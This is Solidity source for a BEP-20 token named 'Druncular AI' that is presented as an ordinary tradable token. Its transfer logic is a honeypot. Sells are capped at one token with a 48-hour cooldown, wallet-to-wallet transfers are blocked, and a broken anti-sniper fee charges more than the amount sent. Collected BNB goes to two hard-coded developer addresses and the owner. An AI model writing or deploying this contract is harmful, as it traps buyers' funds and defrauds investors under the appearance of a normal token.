/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.8.0 <0.9.0;

abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */
    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}


interface IBEP20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the token decimals.
   */
  function decimals() external view returns (uint8);

  /**
   * @dev Returns the token symbol.
   */
  function symbol() external view returns (string memory);

  /**
  * @dev Returns the token name.
  */
  function name() external view returns (string memory);

  /**
   * @dev Returns the bep token owner.
   */
  function getOwner() external view returns (address);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IDexFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}



contract Druncular is IBEP20, Auth {

	address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

	string constant _name = "Druncular AI";
    string constant _symbol = "DRC";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 1000000000 * (10 ** _decimals);
    uint256 private _maxTxAmountBuy = _totalSupply / 50000000;
    uint256 private _maxTxAmountSell = _totalSupply / 1000000000;
	uint256 private _maxWalletAmount = _totalSupply / 50000000;
    uint256 public _maxBuyToken = 50000000;
    uint256 public _maxSellToken = 100000;
    uint256 public _maxWalletToken = 50000000;
    uint256 public _coolDown = 172800;



	mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => uint256) _lastSell;

	uint256 marketingFee = 10;
    uint256 feeDenominator = 100;
    uint256 public percentToMarketing = 50;
	bool public feeOnNonTrade = true;


	address marketingWallet;

	IDexRouter public router;
    address pcs2BNBPair;
    address[] public pairs;

	bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 5000;
    bool inSwap;
    modifier swapping() {
		inSwap = true;
		_;
		inSwap = false;
	}

	uint256 public launchedAt = 0;
	uint256 private antiSniperBlocks = 3;
	uint256 private antiSniperGasLimit = 30 gwei;
	bool private gasLimitActive = true;

	event AutoLiquifyEnabled(bool enabledOrNot);
	event AutoLiquify(uint256 amountBNB, uint256 autoBuybackAmount);


	constructor() Auth(msg.sender) {
		router = IDexRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pcs2BNBPair = IDexFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

		isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
		isTxLimitExempt[msg.sender] = true;
		isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[DEAD] = true;
        isTxLimitExempt[ZERO] = true;

		marketingWallet = msg.sender;
		pairs.push(pcs2BNBPair);
		_balances[msg.sender] = _totalSupply;


		emit Transfer(address(0), msg.sender, _totalSupply);
	}

	receive() external payable {}
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function lastSold(address account) public view returns (uint256) { return _lastSell[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
			require(_allowances[sender][msg.sender] >= amount, "Insufficient Allowance");
            _allowances[sender][msg.sender] -= amount;
        }

        return _transferFrom(sender, recipient, amount);
    }


	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
		require(amount > 0);
        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }

        checkTxLimit(sender, recipient, amount);

        if (shouldSwapBack()) {
            marketing();
        }

        if (!launched() && recipient == pcs2BNBPair) {
            require(_balances[sender] > 0);
            require(sender == owner, "Only the owner can be the first to add liquidity.");
            launch();
        }

		require(amount <= _balances[sender], "Insufficient Balance");
        require(!isWalletToWallet(sender, recipient), "Don't cheat");

        _balances[sender] -= amount;

        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, amount) : amount;
        _balances[recipient] += amountReceived;


        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

	function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
		require(amount <= _balances[sender], "Insufficient Balance");
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

	function checkTxLimit(address sender, address recipient, uint256 amount) internal {
        require(amount <= _maxTxAmountBuy || isTxLimitExempt[sender] || isTxLimitExempt[recipient] && sender == pcs2BNBPair, "TX Limit Exceeded");
		// Max wallet check.
		if (sender != owner
            && recipient != owner
            && !isTxLimitExempt[recipient]
            && recipient != ZERO 
            && recipient != DEAD 
            && recipient != pcs2BNBPair 
            && recipient != address(this)
        ) {
            uint256 newBalance = balanceOf(recipient) + amount;
            require(newBalance <= _maxWalletAmount, "Exceeds max wallet.");
        }
        // Max sell check
        if (sender != owner
            && recipient != owner
            && !isTxLimitExempt[sender]
            && sender != pcs2BNBPair 
            && recipient != address(this)
        ) {
            require(amount <= _maxTxAmountSell, "Sell Limit Exceeded");
            require(_lastSell[sender] + _coolDown < block.timestamp, "Wait a bit longer");
            _lastSell[sender] = block.timestamp;
        }

    }

	function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        if (isFeeExempt[sender] || isFeeExempt[recipient] || !launched()) {
			return false;
		}

        address[] memory liqPairs = pairs;
        for (uint256 i = 0; i < liqPairs.length; i++) {
            if (sender == liqPairs[i] || recipient == liqPairs[i]) {
				return true;
			}
        }

        return feeOnNonTrade;
    }

    function isWalletToWallet(address sender, address recipient) internal view returns (bool) {
        if (isFeeExempt[sender] || isFeeExempt[recipient] || !launched()) {
			return false;
		}

        address[] memory liqPairs = pairs;
        for (uint256 i = 0; i < liqPairs.length; i++) {
            if (sender == liqPairs[i] || recipient == liqPairs[i]) {
				return false;
			}
        }

        return true;
    }

	function setAntisniperBlocks(uint256 blocks) external authorized {
		antiSniperBlocks = blocks;
	}

	function setAntisniperGas(bool active, uint256 quantity) external authorized {
		require(!active || quantity >= 1 gwei, "Needs to be at least 1 gwei.");
		gasLimitActive = active;
		antiSniperGasLimit = quantity;
	}

	function takeFee(address sender, uint256 amount) internal returns (uint256) {
		if (!launched()) {
			return amount;
		}
		uint256 marketingtokens = 0;

		if (block.number - launchedAt <= antiSniperBlocks || gasLimitActive && tx.gasprice >= antiSniperGasLimit) {
			marketingtokens = amount * feeDenominator - 1 / feeDenominator;
            _balances[address(this)] += marketingtokens;
			emit Transfer(sender, address(this), marketingtokens);
        } else {
			if (marketingFee > 0) {
				marketingtokens = amount * marketingFee / feeDenominator;
				_balances[address(this)] += marketingtokens;
				emit Transfer(sender, address(this), marketingtokens);
			}
		}

        return amount - marketingtokens;
    }



    function shouldSwapBack() internal view returns (bool) {
        return launched()
			&& msg.sender != pcs2BNBPair
            && !inSwap
            && swapEnabled
            && _balances[address(this)] >= swapThreshold;
    }

	function setSwapEnabled(bool set) external authorized {
		swapEnabled = set;
		emit AutoLiquifyEnabled(set);
	}

	function marketing() internal swapping {
        uint256 amountToMarketing = balanceOf(address(this)) / 100 * percentToMarketing;
        uint256 amountToLiquidity = balanceOf(address(this)) / 200 * (100-percentToMarketing);
        uint256 amountToSwapForBNB = amountToLiquidity + amountToMarketing;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwapForBNB,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountBNB = address(this).balance;
        uint256 devBNB = amountBNB / 9;
        
        payable(0xf1CDf6C15715fd65Fc8B383D22Eb61F876bfb530).transfer(devBNB);
        payable(0x2363DCd6614d693cEc3844EF0866685fE911A722).transfer(devBNB);
        
        uint256 amountBNBLiquidity = address(this).balance;

		router.addLiquidityETH{value: amountBNBLiquidity}(
			address(this),
			amountToLiquidity,
			0,
			0,
			address(0),
			block.timestamp
		);
            payable(owner).transfer(address(this).balance);
    }

 

	function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() internal {
        launchedAt = block.number;
    }

	function setMaxWallet(uint256 amount) external authorized {
		_maxWalletAmount = amount * _totalSupply / 100;
	}
    function setPercentToMarketing(uint256 marketingPercent) external authorized {
		percentToMarketing = marketingPercent;
	}
   

    function setIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    function setFees(uint256 _marketingFee, uint256 _feeDenominator) external authorized {
        marketingFee = _marketingFee;
        feeDenominator = _feeDenominator;
		uint256 totalFee = _marketingFee;
        require(totalFee < feeDenominator / 5, "Maximum allowed taxation on this contract is 20%.");
    }

    function setMarketingWallet(address _marketingWallet) external authorized {
        marketingWallet = _marketingWallet;
    }

	function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply - balanceOf(DEAD) - balanceOf(ZERO);
    }

	// Recover any BNB sent to the contract by mistake.
	function rescue() external {
        payable(owner).transfer(address(this).balance);
    }

    function addPair(address pair) external authorized {
        pairs.push(pair);
    }
    
    function removeLastPair() external authorized {
        pairs.pop();
    }
}
/**
Unique Features: ask dev on TG
*/